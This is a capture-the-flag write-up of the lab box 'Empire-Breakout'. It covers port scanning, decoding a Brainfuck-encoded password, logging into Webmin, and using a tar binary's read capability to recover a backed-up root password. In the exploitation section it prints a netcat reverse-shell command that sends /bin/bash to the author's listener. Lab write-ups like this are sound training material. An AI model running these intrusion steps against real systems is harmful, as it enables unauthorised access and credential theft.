---
title: "Empire-Breakout"
categories: [CTF, Proving Grounds - Play]
tags: [EASY, Linux, Web, SMB, Webmin, Brainfuck, Capabilities]
mermaid: true
image: ../assets/img/pg/offsec.jpeg
---
The exploration of the "Empire-breakout" box involved several critical steps. First, information gathering was carried out through a port scan using the nmap tool, identifying open ports such as 80, 445, 139, 10000, and 20000. During enumeration, sensitive information was discovered, including an encrypted string in Brainfuck, which was decoded to obtain initial access credentials.
With the credentials "cyber" and ".2uqPEfj3D<P'a-3", initial access to Webmin was obtained. Using the Webmin console, a reverse shell was established, allowing remote access to the system.
During post-exploitation, a "tar" binary with elevated capabilities was identified, allowing the reading of files with any permission. This led to the discovery of a backup file containing an old password, which was used to gain root access to the system.
The process included techniques to exploit vulnerabilities in web services, remote command execution, and privilege escalation, culminating in full system access and the retrieval of proof files.

# Overview

```mermaid
graph TD
    A[Intelligence Gathering]
    A --> B[Port Scan > Port 80,445,139,10000,20000]
    B --> C[Enumeration: HTTP > Brainfuck Encryption]
    C --> D[Exploitation > WebMin, Admin Access]
    D --> E[Post-Exploitation: Privilege Escalation through Capabilities]
    E --> F[Root Shell Access]

```

## 1. Intelligence Gathering

### Port Scan

```bash
sudo nmap -sS -T1 -Pn -p- --open 192.168.190.238 -v
```

![Untitled](../assets/img/pg/Empire/Untitled.png)

## 2. Enumeration

### Porta 80

![Untitled](../assets/img/pg/Empire/Untitled%201.png)

When verifying the page source, I found an encrypted access string (brainfuck).

![Untitled](../assets/img/pg/Empire/Untitled%202.png)

```
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++.
```

A search on Google led to a decoder site:

[https://www.dcode.fr/brainfuck-language](https://www.dcode.fr/brainfuck-language)

![Untitled](../assets/img/pg/Empire/Untitled%203.png)

> .2uqPEfj3D<P'a-3
> 

### Port 445 and 139

The user credentials 'cyber' were previously found using the `enum4linux -a 192.168.190.238` command

### Port 10000

> MiniServ/1.981
> 

![Untitled](../assets/img/pg/Empire/Untitled%204.png)

Webmin version MiniServ/1.981 was found. After searching for exploits, none were found.

### Port 20000

> MiniServ/1.830
> 

![Untitled](../assets/img/pg/Empire/Untitled%205.png)

Webmin version MiniServ/1.830 was found. After searching for exploits, none were found.

## 3. Exploitation

Initial Access

With the credentials “cyber” and “.2uqPEfj3D<P'a-3”, I gained initial access.

![Untitled](../assets/img/pg/Empire/Untitled%206.png)

Accessing the console mode of Webmin, I sent `/bin/bash`

```bash
nc -e /bin/bash 192.168.45.163 666
```

![Untitled](../assets/img/pg/Empire/Untitled%207.png)

Listening on the local machine:

```bash
rlwrap -cAr nc -nlvp 666
```

![image.png](../assets/img/pg/Empire/image.png)

Importing the shell using Python:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

![Untitled](../assets/img/pg/Empire/Untitled%208.png)

## 4. Post-Exploitation

I found the binary “tar” with capabilities:

```bash
getcap -r / 2>/dev/null
```

![Untitled](../assets/img/pg/Empire/Untitled%209.png)

CAP_DAC_READ_SEARCH - This means it can read all files on the system regardless of their permissions.
I found the file “.old_pass.bak” in `/var/backups`

![Untitled](../assets/img/pg/Empire/Untitled%2010.png)

The goal was to compress the file with “tar” to discover the old password.

```bash
./tar -cf pass.tar /var/backups/.old_pass.bak
./tar -xf pass.tar
cat var/backups/.old_pass.bak
```

![image.png](../assets/img/pg/Empire/image%201.png)

Access the root

![image.png](../assets/img/pg/Empire/image%202.png)